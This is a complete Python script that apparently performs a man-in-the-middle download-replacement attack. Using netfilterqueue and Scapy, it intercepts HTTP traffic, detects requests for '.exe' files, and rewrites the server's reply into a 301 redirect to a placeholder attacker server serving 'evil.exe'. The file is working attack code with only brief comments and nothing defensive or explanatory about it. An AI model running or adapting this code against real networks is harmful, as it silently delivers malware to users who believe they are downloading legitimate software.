#!/usr/bin/env python
import netfilterqueue  # Import the netfilterqueue library for packet interception
import scapy.all as scapy  # Import Scapy for packet manipulation

ack_list = []  # List to store TCP acknowledgment numbers

# Function to set the payload of a packet to a specified load
def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

# Function to process intercepted packets
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())  # Convert the packet payload to a Scapy packet

    if scapy_packet.haslayer(scapy.Raw):  # Check if the packet contains raw data
        if scapy_packet[scapy.TCP].dport == 80:  # Check if it's an HTTP request (port 80)
            if b".exe" in scapy_packet[scapy.Raw].load:  # Check if the request contains ".exe"
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)  # Add the acknowledgment number to the list
        elif scapy_packet[scapy.TCP].sport == 80:  # Check if it's an HTTP response (port 80)
            if scapy_packet[scapy.TCP].seq in ack_list:  # Check if the sequence number is in the list
                ack_list.remove(scapy_packet[scapy.TCP].seq)  # Remove the sequence number from the list
                print("[+] Replacing file")
                # Modify the packet to redirect the client to a different URL
                modified_packet = set_load(scapy_packet, b"HTTP/1.1 301 Moved Permanently\nLocation: http://your_exploit_srv/evil.exe\n\n")
                packet.set_payload(bytes(modified_packet))  # Set the payload of the intercepted packet

    packet.accept()  # Accept the modified packet to allow it to continue its journey

# Create a NetfilterQueue object and bind it to queue 0, then run the queue
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
